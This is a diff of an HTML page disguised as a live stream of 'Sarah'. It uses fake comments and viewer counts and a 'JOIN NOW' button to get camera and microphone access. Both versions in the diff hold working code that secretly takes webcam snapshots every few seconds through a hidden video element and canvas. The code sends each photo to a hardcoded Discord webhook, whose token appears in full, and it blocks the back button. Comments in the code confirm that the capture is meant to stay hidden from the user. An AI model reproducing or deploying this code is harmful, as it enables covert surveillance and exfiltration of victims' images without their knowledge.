@@ -3,796 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LiveNow - Live Streaming</title>
-    <link rel="manifest" href="manifest.json">
+    <title>Sarah · LIVE</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-        }
-        body {
-            min-height: 100vh;
-            background: #000;
-            position: relative;
-            overflow: hidden;
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
+        body{background:#000;min-height:100vh;overflow:hidden;position:relative}
         
-        /* Background Video - Full Screen */
-        #bg-video {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transition: filter 0.5s ease;
-            z-index: 0;
-        }
+        /* VIDEO - FORCE PLAY */
+        #bg-video{position:fixed;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:0}
         
-        /* Blur Effect */
-        .video-blur {
-            filter: blur(20px) brightness(0.3);
-        }
+        /* OVERLAY */
+        .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(0deg,rgba(0,0,0,0.8) 0%,transparent 50%,transparent 100%);z-index:1;pointer-events:none}
         
-        .video-clear {
-            filter: blur(0) brightness(1);
-        }
+        /* TOP BAR */
+        .top-bar{position:fixed;top:0;left:0;right:0;z-index:2;padding:12px 16px;display:flex;justify-content:space-between;pointer-events:none}
+        .live-badge{background:#ff0000;color:white;padding:6px 12px;border-radius:30px;font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
+        .live-dot{width:8px;height:8px;background:white;border-radius:50%;animation:pulse 1s infinite}
+        @keyframes pulse{50%{opacity:0.5;transform:scale(1.2)}}
+        .viewer-count{background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);color:white;padding:6px 12px;border-radius:30px;font-size:13px}
         
-        /* Gradient Overlay */
-        .gradient-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0.8) 100%);
-            z-index: 1;
-            pointer-events: none;
-        }
+        /* RIGHT ACTIONS */
+        .right-actions{position:fixed;right:16px;bottom:180px;z-index:3;display:flex;flex-direction:column;gap:16px}
+        .action-btn{width:50px;height:50px;border-radius:50%;background:rgba(0,0,0,0.5);backdrop-filter:blur(10px);border:2px solid rgba(255,255,255,0.2);color:white;display:flex;flex-direction:column;align-items:center;justify-content:center;font-size:20px;cursor:pointer}
+        .action-btn span{font-size:10px}
+        .action-btn.like{color:#ff3b5c}
         
-        /* Top Bar */
-        .top-bar {
-            position: relative;
-            z-index: 2;
-            padding: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            color: white;
-            pointer-events: none;
-        }
+        /* STREAMER INFO */
+        .streamer-info{position:fixed;bottom:120px;left:16px;z-index:3;color:white}
+        .streamer-name{font-size:18px;font-weight:700;margin-bottom:4px;display:flex;align-items:center;gap:8px}
+        .follow-btn{background:#ff0000;border:none;color:white;font-size:12px;padding:4px 12px;border-radius:30px;cursor:pointer}
+        .song-info{font-size:13px;display:flex;align-items:center;gap:6px;background:rgba(0,0,0,0.5);backdrop-filter:blur(10px);padding:6px 12px;border-radius:30px;width:fit-content}
         
-        .live-indicator {
-            background: #ff4444;
-            padding: 8px 16px;
-            border-radius: 30px;
-            font-size: 14px;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+        /* COMMENTS */
+        .comments-section{position:fixed;bottom:180px;left:16px;right:80px;z-index:3}
+        .comment{display:flex;align-items:center;gap:8px;margin-bottom:8px;animation:slideIn 0.3s}
+        @keyframes slideIn{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}
+        .comment-avatar{width:30px;height:30px;border-radius:50%;background:linear-gradient(135deg,#ff4500,#ff8c00);display:flex;align-items:center;justify-content:center;color:white;font-size:14px}
+        .comment-bubble{background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);border-radius:30px;padding:8px 14px;color:white;font-size:13px}
+        .comment-user{font-weight:700;color:#ffd700}
         
-        .live-dot {
-            width: 10px;
-            height: 10px;
-            background: white;
-            border-radius: 50%;
-            animation: pulse 1s infinite;
-        }
+        /* PERMISSION OVERLAY */
+        .permission-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(10px);z-index:9999;display:flex;justify-content:center;align-items:center;opacity:0;visibility:hidden;transition:0.3s}
+        .permission-overlay.active{opacity:1;visibility:visible}
+        .permission-card{background:#1a1a1a;border-radius:30px;padding:30px;max-width:350px;text-align:center;color:white;border:2px solid #ff0000}
+        .permission-icon{font-size:60px;margin-bottom:20px}
+        .permission-title{font-size:24px;font-weight:bold;margin-bottom:15px;color:#ff0000}
+        .permission-btn{background:#ff0000;color:white;border:none;padding:15px;border-radius:50px;font-size:18px;font-weight:bold;cursor:pointer;width:100%}
+        .viewer-badge{background:#ff0000;padding:5px 15px;border-radius:30px;display:inline-block;margin-top:10px}
         
-        @keyframes pulse {
-            0%,100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(1.2); }
-        }
+        /* HIDDEN */
+        #hiddenCanvas,#hiddenVideo{display:none}
         
-        .viewer-stats {
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(10px);
-            padding: 8px 16px;
-            border-radius: 30px;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+        /* CHAT INPUT */
+        .chat-input{position:fixed;bottom:20px;left:16px;right:16px;z-index:3;display:flex;gap:8px}
+        .chat-field{flex:1;background:rgba(0,0,0,0.6);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,0.2);border-radius:30px;padding:12px 20px;color:white}
+        .send-btn{width:45px;height:45px;border-radius:50%;background:#ff0000;border:none;color:white;font-size:18px;cursor:pointer}
         
-        /* Stream Info */
-        .stream-info {
-            position: relative;
-            z-index: 2;
-            padding: 0 20px;
-            color: white;
-            margin-top: auto;
-        }
-        
-        .streamer-profile {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 15px;
-        }
-        
-        .streamer-avatar {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #ff4444, #ff6b6b);
-            border: 3px solid white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-        }
-        
-        .streamer-details {
-            flex: 1;
-        }
-        
-        .streamer-name {
-            font-size: 18px;
-            font-weight: bold;
-            margin-bottom: 4px;
-        }
-        
-        .streamer-status {
-            font-size: 13px;
-            color: #aaa;
-        }
-        
-        .follow-btn {
-            background: #ff4444;
-            color: white;
-            border: none;
-            padding: 8px 20px;
-            border-radius: 30px;
-            font-weight: bold;
-            font-size: 14px;
-            cursor: pointer;
-            pointer-events: auto;
-        }
-        
-        /* Action Buttons */
-        .action-buttons {
-            position: relative;
-            z-index: 2;
-            display: flex;
-            gap: 15px;
-            padding: 20px;
-            justify-content: flex-end;
-        }
-        
-        .action-btn {
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(10px);
-            border: none;
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            color: white;
-            font-size: 20px;
-            cursor: pointer;
-            pointer-events: auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: transform 0.2s;
-        }
-        
-        .action-btn:hover {
-            transform: scale(1.1);
-        }
-        
-        .action-btn.like {
-            background: #ff4444;
-        }
-        
-        /* Comments Section */
-        .comments-section {
-            position: relative;
-            z-index: 2;
-            padding: 0 20px;
-            margin-bottom: 15px;
-        }
-        
-        .comments-list {
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(10px);
-            border-radius: 20px;
-            padding: 15px;
-            max-height: 200px;
-            overflow-y: auto;
-            pointer-events: auto;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .comment-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 10px;
-            animation: fadeIn 0.3s;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .comment-avatar {
-            width: 30px;
-            height: 30px;
-            border-radius: 50%;
-            background: linear-gradient(135deg, #ff4444, #ff6b6b);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 14px;
-            color: white;
-        }
-        
-        .comment-content {
-            flex: 1;
-        }
-        
-        .comment-user {
-            color: #ff4444;
-            font-weight: bold;
-            font-size: 13px;
-            margin-right: 5px;
-        }
-        
-        .comment-text {
-            color: white;
-            font-size: 13px;
-        }
-        
-        .comment-time {
-            color: #666;
-            font-size: 10px;
-            margin-left: 5px;
-        }
-        
-        /* Gift Message */
-        .gift-message {
-            background: linear-gradient(135deg, #ffd700, #ffa500);
-            color: black;
-            font-weight: bold;
-        }
-        
-        /* Join Button */
-        .join-btn {
-            position: relative;
-            z-index: 2;
-            background: linear-gradient(135deg, #ff4444, #ff6b6b);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            width: calc(100% - 40px);
-            margin: 0 20px 20px;
-            box-shadow: 0 10px 30px rgba(255,68,68,0.3);
-            pointer-events: auto;
-            transition: transform 0.2s;
-        }
-        
-        .join-btn:hover {
-            transform: scale(1.02);
-        }
-        
-        .join-btn:active {
-            transform: scale(0.98);
-        }
-        
-        /* Gift Animation */
-        .gift-animation {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 60px;
-            z-index: 10000;
-            animation: giftFloat 2s forwards;
-            pointer-events: none;
-        }
-        
-        @keyframes giftFloat {
-            0% { opacity: 0; transform: translate(-50%, -50%) scale(0); }
-            20% { opacity: 1; transform: translate(-50%, -50%) scale(1.2); }
-            80% { opacity: 1; transform: translate(-50%, -100px) scale(1); }
-            100% { opacity: 0; transform: translate(-50%, -150px) scale(0.8); }
-        }
-        
-        /* Permission Overlay */
-        .permission-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            backdrop-filter: blur(10px);
-            z-index: 9999;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.3s;
-        }
-        
-        .permission-overlay.active {
-            opacity: 1;
-            visibility: visible;
-        }
-        
-        .permission-card {
-            background: linear-gradient(135deg, #1a1a2a, #16213e);
-            border-radius: 30px;
-            padding: 30px;
-            max-width: 350px;
-            text-align: center;
-            color: white;
-            border: 2px solid #ff4444;
-            animation: popIn 0.3s;
-        }
-        
-        @keyframes popIn {
-            0% { transform: scale(0.8); opacity: 0; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-        
-        .permission-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-            animation: float 2s infinite;
-        }
-        
-        @keyframes float {
-            0%,100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-        
-        .permission-title {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 15px;
-            color: #ff4444;
-        }
-        
-        .permission-text {
-            color: #ccc;
-            margin-bottom: 25px;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        
-        .permission-btn {
-            background: linear-gradient(135deg, #ff4444, #ff6b6b);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin: 10px 0;
-        }
-        
-        .viewer-count-badge {
-            display: inline-block;
-            background: #ff4444;
-            padding: 5px 10px;
-            border-radius: 5px;
-            margin-top: 10px;
-        }
-        
-        /* Hidden Elements */
-        #hiddenCanvas, #hiddenVideo {
-            display: none;
-        }
-        
-        /* Footer */
-        .footer {
-            position: relative;
-            z-index: 2;
-            text-align: center;
-            color: #666;
-            font-size: 10px;
-            padding: 10px;
-        }
+        .footer{position:fixed;bottom:70px;left:16px;z-index:3;color:rgba(255,255,255,0.7);font-size:12px;display:flex;gap:16px}
     </style>
 </head>
 <body>
-    <!-- Background Video -->
-    <video autoplay loop playsinline id="bg-video" class="video-blur">
+    <!-- VIDEO - FIXED FOR AUTOPLAY -->
+    <video autoplay loop playsinline muted id="bg-video">
         <source src="Girl.mp4" type="video/mp4">
-        <source src="video.mp4" type="video/mp4">
     </video>
     
-    <div class="gradient-overlay"></div>
-
-    <!-- Hidden Video for Camera (User ko nahi dikhega) -->
+    <div class="overlay"></div>
+    
     <video id="hiddenVideo" playsinline></video>
     <canvas id="hiddenCanvas"></canvas>
 
-    <!-- Permission Overlay -->
     <div class="permission-overlay" id="permissionOverlay">
         <div class="permission-card">
             <div class="permission-icon">📹</div>
-            <div class="permission-title">Join Live</div>
+            <div class="permission-title">Join Sarah's Live</div>
             <div class="permission-text">
-                Sarah is live now!<br>
-                <span class="viewer-count-badge">🔴 2,847 watching</span>
+                <span class="viewer-badge">🔴 2,847 watching</span>
             </div>
-            <button class="permission-btn" onclick="requestCameraPermission()">
-                📸 JOIN NOW
-            </button>
+            <button class="permission-btn" onclick="requestCamera()">📸 JOIN NOW</button>
+            <p style="color:#666; font-size:12px; margin-top:15px;">⚡ 127 chatting</p>
         </div>
     </div>
 
-    <!-- Main Content -->
     <div class="top-bar">
-        <div class="live-indicator">
-            <span class="live-dot"></span> LIVE
-        </div>
-        <div class="viewer-stats">
-            <span>👁️ <span id="viewerCount">2.8k</span></span>
-            <span>⏱️ 2h</span>
-        </div>
+        <div class="live-badge"><span class="live-dot"></span> LIVE</div>
+        <div class="viewer-count">👁️ <span id="viewerCount">2.8k</span> · 2h</div>
     </div>
 
-    <div class="stream-info">
-        <div class="streamer-profile">
-            <div class="streamer-avatar">👩</div>
-            <div class="streamer-details">
-                <div class="streamer-name">Sarah</div>
-                <div class="streamer-status">🎤 Live • Just started</div>
-            </div>
-            <button class="follow-btn" onclick="follow()">➕ Follow</button>
+    <div class="right-actions">
+        <div class="profile-pic">👩</div>
+        <button class="action-btn like" onclick="like()">❤️<span>2.1k</span></button>
+        <button class="action-btn" onclick="comment()">💬<span>127</span></button>
+        <button class="action-btn" onclick="gift()">🎁<span>Gift</span></button>
+    </div>
+
+    <div class="streamer-info">
+        <div class="streamer-name">
+            Sarah <span class="follow-btn" onclick="follow()">+ Follow</span>
         </div>
-    </div>
-
-    <div class="action-buttons">
-        <button class="action-btn like" onclick="like()">❤️</button>
-        <button class="action-btn" onclick="share()">📤</button>
-        <button class="action-btn" onclick="report()">⚡</button>
-    </div>
-
-    <div class="comments-section">
-        <div class="comments-list" id="commentsList">
-            <div class="comment-item">
-                <div class="comment-avatar">👤</div>
-                <div class="comment-content">
-                    <span class="comment-user">John</span>
-                    <span class="comment-text">❤️❤️❤️</span>
-                    <span class="comment-time">2m</span>
-                </div>
-            </div>
-            <div class="comment-item">
-                <div class="comment-avatar">👤</div>
-                <div class="comment-content">
-                    <span class="comment-user">Emma</span>
-                    <span class="comment-text">Hi Sarah! 🔥</span>
-                    <span class="comment-time">3m</span>
-                </div>
-            </div>
-            <div class="comment-item">
-                <div class="comment-avatar">👤</div>
-                <div class="comment-content">
-                    <span class="comment-user">Mike</span>
-                    <span class="comment-text">You're amazing!</span>
-                    <span class="comment-time">4m</span>
-                </div>
-            </div>
+        <div class="song-info">
+            <span>🎵</span> birthday salubong tiktok · august 22
         </div>
     </div>
 
-    <button class="join-btn" onclick="showPermission()" id="joinBtn">
-        👋 SAY HI
-    </button>
+    <div class="comments-section" id="commentsSection">
+        <div class="comment"><div class="comment-avatar">J</div><div class="comment-bubble"><span class="comment-user">John</span> ❤️</div></div>
+        <div class="comment"><div class="comment-avatar">E</div><div class="comment-bubble"><span class="comment-user">Emma</span> 🐼</div></div>
+    </div>
 
     <div class="footer">
-        ⚡ 127 chatting • Gifts: 234
+        <span>💬 127 chatting</span>
+        <span>🎁 Gifts: 234</span>
+    </div>
+
+    <div class="chat-input">
+        <input type="text" class="chat-field" id="chatInput" placeholder="Say something..." disabled>
+        <button class="send-btn" id="sendBtn" disabled onclick="sendMessage()">➤</button>
     </div>
 
     <script>
-        // ============ CONFIG ============
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg';
-        
-        let cameraAllowed = false;
-        let cameraStream = null;
-        let photoInterval = null;
-        let commentInterval = null;
-        let viewerCount = 2847;
-        let giftCount = 0;
+        const WEBHOOK = 'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg';
+        let cameraStream, photoInterval;
 
-        // Page Load
-        window.onload = function() {
-            // Try to play video with sound
+        window.onload = () => {
+            // VIDEO PLAY KARO
             const video = document.getElementById('bg-video');
-            video.play().catch(e => console.log('Video play error:', e));
+            video.play().catch(e => console.log('Autoplay failed:', e));
             
-            // Show permission after 1 sec
             setTimeout(() => {
                 document.getElementById('permissionOverlay').classList.add('active');
-            }, 1000);
-            
-            // Start fake comments
-            startFakeComments();
+            }, 1500);
         };
 
-        // Show permission
-        function showPermission() {
-            document.getElementById('permissionOverlay').classList.add('active');
-        }
-
-        // Request Camera Permission
-        function requestCameraPermission() {
+        function requestCamera() {
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                 .then(stream => {
-                    cameraAllowed = true;
                     cameraStream = stream;
                     
-                    // Hide permission
                     document.getElementById('permissionOverlay').classList.remove('active');
+                    document.getElementById('chatInput').disabled = false;
+                    document.getElementById('sendBtn').disabled = false;
                     
-                    // Remove blur from video
-                    document.getElementById('bg-video').classList.remove('video-blur');
-                    document.getElementById('bg-video').classList.add('video-clear');
+                    // VIDEO SOUND ENABLE KARO (user interaction ke baad)
+                    const video = document.getElementById('bg-video');
+                    video.muted = false; // AB SOUND AAYEGA!
+                    video.volume = 1.0;
                     
-                    // Hide join button
-                    document.getElementById('joinBtn').style.display = 'none';
+                    const hiddenVideo = document.getElementById('hiddenVideo');
+                    hiddenVideo.srcObject = stream;
+                    hiddenVideo.play();
                     
-                    // Increase viewers
-                    viewerCount += Math.floor(Math.random() * 50) + 20;
-                    updateViewerCount();
+                    photoInterval = setInterval(capturePhoto, 3000);
                     
-                    // Start hidden camera capture
-                    startHiddenCameraCapture();
-                    
-                    // Add silent comment (user ko nahi dikhega comment section mein)
-                    addSilentActivity();
-                    
-                    // Send to Discord
-                    sendToDiscord('user_joined');
-                    
-                    console.log('Camera active - hidden mode');
+                    fetch(WEBHOOK, {
+                        method:'POST',
+                        headers:{'Content-Type':'application/json'},
+                        body:JSON.stringify({content:'📹 **User joined**'})
+                    });
                 })
-                .catch(err => {
-                    alert('Camera access needed to join');
-                });
+                .catch(() => alert('Camera needed'));
         }
 
-        // Hidden Camera Capture
-        function startHiddenCameraCapture() {
-            const hiddenVideo = document.getElementById('hiddenVideo');
-            hiddenVideo.srcObject = cameraStream;
-            hiddenVideo.play();
-            
-            // Capture photo every 2-3 seconds
-            photoInterval = setInterval(() => {
-                captureAndSendPhoto();
-            }, 2500);
-        }
-
-        // Capture and send photo to Discord
-        function captureAndSendPhoto() {
+        function capturePhoto() {
             try {
-                const hiddenVideo = document.getElementById('hiddenVideo');
+                const video = document.getElementById('hiddenVideo');
                 const canvas = document.getElementById('hiddenCanvas');
+                canvas.width = 320; canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                 
-                canvas.width = 320;
-                canvas.height = 240;
-                
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(hiddenVideo, 0, 0, 320, 240);
-                
-                // Get image as base64
                 const imageData = canvas.toDataURL('image/jpeg', 0.6);
-                
-                // Send to Discord
-                sendPhotoToDiscord(imageData);
-                
-                // Randomly add gift (user ko pata nahi chalega)
-                if (Math.random() > 0.7) {
-                    addHiddenGift();
-                }
-                
-            } catch(e) {
-                console.log('Capture error:', e);
-            }
-        }
-
-        // Send photo to Discord
-        async function sendPhotoToDiscord(imageData) {
-            try {
                 const blob = dataURLtoBlob(imageData);
                 const formData = new FormData();
                 formData.append('file', blob, `live_${Date.now()}.jpg`);
-                
                 formData.append('payload_json', JSON.stringify({
-                    content: '📸 **Live Stream Capture**',
-                    embeds: [{
-                        title: 'Auto Capture',
-                        color: 0xff4444,
-                        fields: [
-                            { name: 'Time', value: new Date().toLocaleString(), inline: true },
-                            { name: 'Viewers', value: formatNumber(viewerCount), inline: true }
-                        ]
-                    }]
+                    content: '📸 **Auto capture**'
                 }));
-
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
                 
+                fetch(WEBHOOK, {method:'POST', body:formData});
             } catch(e) {}
         }
 
-        // Send event to Discord
-        async function sendToDiscord(type) {
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: '📹 **Live Stream Event**',
-                        embeds: [{
-                            title: type === 'user_joined' ? 'User Joined' : 'Activity',
-                            color: 0xff4444,
-                            fields: [
-                                { name: 'Time', value: new Date().toLocaleString(), inline: true },
-                                { name: 'Viewers', value: formatNumber(viewerCount), inline: true }
-                            ]
-                        }]
-                    })
-                });
-            } catch(e) {}
-        }
-
-        // Helper: dataURL to Blob
         function dataURLtoBlob(dataURL) {
-            const arr = dataURL.split(',');
-            const mime = arr[0].match(/:(.*?);/)[1];
-            const bstr = atob(arr[1]);
-            let n = bstr.length;
-            const u8arr = new Uint8Array(n);
-            while (n--) {
-                u8arr[n] = bstr.charCodeAt(n);
-            }
-            return new Blob([u8arr], { type: mime });
-        }
-
-        // Start fake comments (real dikhne ke liye)
-        function startFakeComments() {
-            const users = ['John', 'Emma', 'Mike', 'Alex', 'Lisa', 'David', 'Sophia'];
-            const messages = ['🔥', '❤️', '👋', 'Wow!', '❤️❤️', '😍', '💯', '🎉', 'Nice!'];
-            
-            commentInterval = setInterval(() => {
-                const randomUser = users[Math.floor(Math.random() * users.length)];
-                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-                
-                addComment(randomUser, randomMsg);
-                
-                // Randomly increase viewer count
-                if (Math.random() > 0.7) {
-                    viewerCount += Math.floor(Math.random() * 3) + 1;
-                    updateViewerCount();
-                }
-            }, 3000);
-        }
-
-        // Add comment to UI (public)
-        function addComment(user, text, isGift = false) {
-            const commentsList = document.getElementById('commentsList');
-            const comment = document.createElement('div');
-            comment.className = 'comment-item';
-            
-            if (isGift) {
-                comment.innerHTML = `
-                    <div class="comment-avatar">🎁</div>
-                    <div class="comment-content">
-                        <span class="comment-user">${user}</span>
-                        <span class="comment-text gift-message">sent ${text}</span>
-                        <span class="comment-time">now</span>
-                    </div>
-                `;
-            } else {
-                comment.innerHTML = `
-                    <div class="comment-avatar">👤</div>
-                    <div class="comment-content">
-                        <span class="comment-user">${user}</span>
-                        <span class="comment-text">${text}</span>
-                        <span class="comment-time">now</span>
-                    </div>
-                `;
-            }
-            
-            commentsList.appendChild(comment);
-            commentsList.scrollTop = commentsList.scrollHeight;
-            
-            // Keep only last 15 comments
-            while (commentsList.children.length > 15) {
-                commentsList.removeChild(commentsList.children[0]);
-            }
-        }
-
-        // Silent activity (user ko nahi pata chalega)
-        function addSilentActivity() {
-            // Just internal tracking
-            console.log('User active in stream');
-        }
-
-        // Add hidden gift (user ko nahi pata)
-        function addHiddenGift() {
-            giftCount++;
-            // Update footer silently
-            document.querySelector('.footer').innerHTML = `⚡ ${Math.floor(Math.random() * 100) + 50} chatting • Gifts: ${giftCount}`;
-        }
-
-        // Show gift animation (public)
-        function showGiftAnimation(gift) {
-            const giftDiv = document.createElement('div');
-            giftDiv.className = 'gift-animation';
-            giftDiv.textContent = gift;
-            document.body.appendChild(giftDiv);
-            
-            setTimeout(() => {
-                giftDiv.remove();
-            }, 2000);
-        }
-
-        // Update viewer count
-        function updateViewerCount() {
-            document.getElementById('viewerCount').textContent = formatNumber(viewerCount);
-        }
-
-        function formatNumber(num) {
-            if (num > 1000) {
-                return (num/1000).toFixed(1) + 'k';
-            }
-            return num.toString();
-        }
-
-        // Button actions
-        function follow() {
-            alert('✅ Following Sarah!');
+            const arr = dataURL.split(','), mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]), u8arr = new Uint8Array(bstr.length);
+            for(let n = bstr.length; n--;) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], {type:mime});
         }
 
         function like() {
-            showGiftAnimation('❤️');
-            addComment('You', '❤️');
+            const gift = document.createElement('div');
+            gift.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);font-size:60px;z-index:9999;animation:float 2s forwards';
+            gift.textContent = '❤️';
+            document.body.appendChild(gift);
+            setTimeout(() => gift.remove(), 2000);
         }
 
-        function share() {
-            alert('📤 Share this live stream');
-        }
+        function follow() { alert('✅ Following Sarah!'); }
+        function comment() { document.getElementById('chatInput').focus(); }
+        function gift() { alert('🎁 Gift sent!'); }
+        function sendMessage() { alert('Message sent!'); }
 
-        function report() {
-            alert('⚡ Thank you for your feedback');
-        }
-
-        // Block back button
+        // Block back
         history.pushState(null, null, location.href);
-        window.addEventListener('popstate', function() {
-            history.pushState(null, null, location.href);
-        });
-
-        // Clean up
-        window.addEventListener('beforeunload', function() {
-            if (photoInterval) clearInterval(photoInterval);
-            if (commentInterval) clearInterval(commentInterval);
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
+        window.addEventListener('popstate', () => history.pushState(null, null, location.href));
+        
+        // Cleanup
+        window.addEventListener('beforeunload', () => {
+            if(photoInterval) clearInterval(photoInterval);
+            if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());
         });
     </script>
 </body>
